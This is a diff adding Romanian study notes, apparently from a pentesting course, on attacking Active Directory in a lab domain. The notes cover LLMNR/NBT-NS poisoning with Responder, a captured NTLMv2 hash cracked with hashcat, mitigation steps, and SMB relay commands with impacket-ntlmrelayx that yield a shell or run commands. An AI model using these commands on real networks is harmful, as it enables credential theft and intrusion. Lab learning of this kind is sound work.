@@ -543,6 +543,132 @@ Obiecte în Active Directory:
 Link: https://www.microsoft.com/en-us/evalcenter
 Instalam rolul de DC + Certificate Authority pe serverul Windows:
 
+```powershell
+C:\Users\Administrator>setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\SQLService
+Checking domain DC=MARVEL,DC=local
+
+Registering ServicePrincipalNames for CN=SQL Service,CN=Users,DC=MARVEL,DC=local
+        HYDRA-DC/SQLService.MARVEL.local:60111
+Updated object
+```
+
+```
+C:\Users\Administrator>setspn -T MARVEL.local -Q */*
+Checking domain DC=MARVEL,DC=local
+CN=HYDRA-DC,OU=Domain Controllers,DC=MARVEL,DC=local
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/HYDRA-DC.MARVEL.local
+        ldap/HYDRA-DC.MARVEL.local/ForestDnsZones.MARVEL.local
+        ldap/HYDRA-DC.MARVEL.local/DomainDnsZones.MARVEL.local
+        DNS/HYDRA-DC.MARVEL.local
+        GC/HYDRA-DC.MARVEL.local/MARVEL.local
+        RestrictedKrbHost/HYDRA-DC.MARVEL.local
+        RestrictedKrbHost/HYDRA-DC
+        RPC/5e93da09-87ac-40d9-8d99-6af92fe3fe43._msdcs.MARVEL.local
+        HOST/HYDRA-DC/MARVEL
+        HOST/HYDRA-DC.MARVEL.local/MARVEL
+        HOST/HYDRA-DC
+        HOST/HYDRA-DC.MARVEL.local
+        HOST/HYDRA-DC.MARVEL.local/MARVEL.local
+        E3514235-4B06-11D1-AB04-00C04FC2DCD2/5e93da09-87ac-40d9-8d99-6af92fe3fe43/MARVEL.local
+        ldap/HYDRA-DC/MARVEL
+        ldap/5e93da09-87ac-40d9-8d99-6af92fe3fe43._msdcs.MARVEL.local
+        ldap/HYDRA-DC.MARVEL.local/MARVEL
+        ldap/HYDRA-DC
+        ldap/HYDRA-DC.MARVEL.local
+        ldap/HYDRA-DC.MARVEL.local/MARVEL.local
+CN=krbtgt,CN=Users,DC=MARVEL,DC=local
+        kadmin/changepw
+CN=SQL Service,CN=Users,DC=MARVEL,DC=local
+        HYDRA-DC/SQLService.MARVEL.local:60111
+
+Existing SPN found!
+```
+
+`SPN` -#TODO what is it?
+
+# Attacking Active Directory: Initial Attack Vectors:
+## Initial AD Attack Vectors:
+### LLMNR Poisoning Overview:
+`LLMR `                         -#TODO
+`NBT-NS`                        -#TODO
+`WPAD`                          -#TODO
+```bash
+sudo responder -I tun0 -dwP
+```
+Dupa ce primim hash-ul o sa avem posibilitatea dea face brut la hash cu `hashcat` sau `john`:
+```bash
+hashcat -m 5600 hashes.txt rockyou.txt
+```
 
 
+![README-2025-11-18-09-56-47.png](../src/img/README-2025-11-18-09-56-47.png)
+![README-2025-11-18-09-57-04.png](../src/img/README-2025-11-18-09-57-04.png)
+![README-2025-11-18-09-58-08.png](../src/img/README-2025-11-18-09-58-08.png)
 
+
+### Capturing Hashes with Responder:
+
+```bash
+responder -I eth0 -dwv
+```
+Dupa aceasta utilizatorul aceseasa resursa gresita de genu `\\<IP_responder>` si primim hash-ul acestuia
+
+```
+[*] [DHCP] Found DHCP server IP: 172.16.49.254, now waiting for incoming requests...
+
+[*] [NBT-NS] Poisoned answer sent to 172.16.49.145 for name MARVEL (service: Domain Master Browser)
+[*] [NBT-NS] Poisoned answer sent to 172.16.49.145 for name MARVEL (service: Domain Master Browser)
+[*] [NBT-NS] Poisoned answer sent to 172.16.49.145 for name MARVEL (service: Domain Master Browser)
+[*] [NBT-NS] Poisoned answer sent to 172.16.49.145 for name MARVEL (service: Browser Election)
+[SMB] NTLMv2-SSP Client   : 172.16.49.145
+[SMB] NTLMv2-SSP Username : MARVEL\fcastle
+[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:68e9075bfd1a2253:1711F02FB7EEC04D0D1C79D77E75C4DD:010100000000000080C81BF93958DC01BCF43009E325FB3F00000000020008004D0034004F00330001001E00570049004E002D004E00460044003500580049005A00540048003600540004003400570049004E002D004E00460044003500580049005A0054004800360054002E004D0034004F0033002E004C004F00430041004C00030014004D0034004F0033002E004C004F00430041004C00050014004D0034004F0033002E004C004F00430041004C000700080080C81BF93958DC0106000400020000000800500050000000000000000100000000200000C8B8E417918D95A60079B84E45599682D06AD2ABD1BC3305E86DD55534C20515BF57E9B0E29ADEE6245AFDAB1992C94561BD476AC88355299BB27C88B7580F890A001000000000000000000000000000000000000900240063006900660073002F003100370032002E00310036002E00340039002E003100340033000000000000000000
+```
+
+###  Cracking Our Captured Hashes:
+```bash
+hashcat -m 5600 hash.fcastle all.txt
+```
+Rezultatul trebuie sa arata in felul urmator:
+```bash
+FCASTLE::MARVEL:68e9075bfd1a2253:1711f02fb7eec04d0d1c79d77e75c4dd:010100000000000080c81bf93958dc01bcf43009e325fb3f00000000020008004d0034004f00330001001e00570049004e002d004e00460044003500580049005a00540048003600540004003400570049004e002d004e00460044003500580049005a0054004800360054002e004d0034004f0033002e004c004f00430041004c00030014004d0034004f0033002e004c004f00430041004c00050014004d0034004f0033002e004c004f00430041004c000700080080c81bf93958dc0106000400020000000800500050000000000000000100000000200000c8b8e417918d95a60079b84e45599682d06ad2abd1bc3305e86dd55534c20515bf57e9b0e29adee6245afdab1992c94561bd476ac88355299bb27c88b7580f890a001000000000000000000000000000000000000900240063006900660073002f003100370032002e00310036002e00340039002e003100340033000000000000000000:Password123456789
+```
+
+### LLMNR Poisoning Mitigation:
+![README-2025-11-18-11-32-43.png](../src/img/README-2025-11-18-11-32-43.png)
+Mitigarea atacurilor de tip LLMNR (Link-Local Multicast Name Resolution) și NBT-NS (NetBIOS Name Service)
+ **Cea mai bună apărare este dezactivarea LLMNR și NBT-NS:**
+1. **Dezactivarea LLMNR:**
+    - Accesează:
+        - _Local Computer Policy_ > _Computer Configuration_ > _Administrative Templates_ > _Network_ > _DNS Client_.
+    - Selectează opțiunea: **"Turn OFF Multicast Name Resolution"**.
+2. **Dezactivarea NBT-NS:**
+    - Accesează:
+        - _Network Connections_ > _Network Adapter Properties_ > _TCP/IPv4 Properties_ > _Advanced tab_ > _WINS tab_.
+    - Selectează opțiunea: **"Disable NetBIOS over TCP/IP"**.
+![README-2025-11-18-13-53-05.png](../src/img/README-2025-11-18-13-53-05.png)
+Aceștea sunt pași care trebuie urmați pentru a micșora riscul acestui atac.
+
+
+### SMB Relay Attacks:
+`SMB`                           - #TODO
+`SMB Relay`                     - #TODO
+![README-2025-11-18-13-49-41.png](../src/img/README-2025-11-18-13-49-41.png)
+Pentru a starta acest tip de attack trebuie sa configuram fisierul `nano /usr/share/responder/Responder.conf`
+Identify Hosts without SMB Signing:
+```bash
+nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
+```
+![README-2025-11-18-14-15-04.png](../src/img/README-2025-11-18-14-15-04.png)
+![README-2025-11-18-14-15-42.png](../src/img/README-2025-11-18-14-15-42.png)
+
+Instalam srcipturile `impacket-*`:
+```bash
+sudo apt install impacket-scripts
+```
+
+```bash
+impacket-ntlmrelayx -tf target.txt -smb2support
+impacket-ntlmrelayx -tf target.txt -smb2support -i # to get shell we can use -i 
+impacket-ntlmrelayx -tf target.txt -smb2support -c "whoami" # rulam de odata comanda dorita  
+```
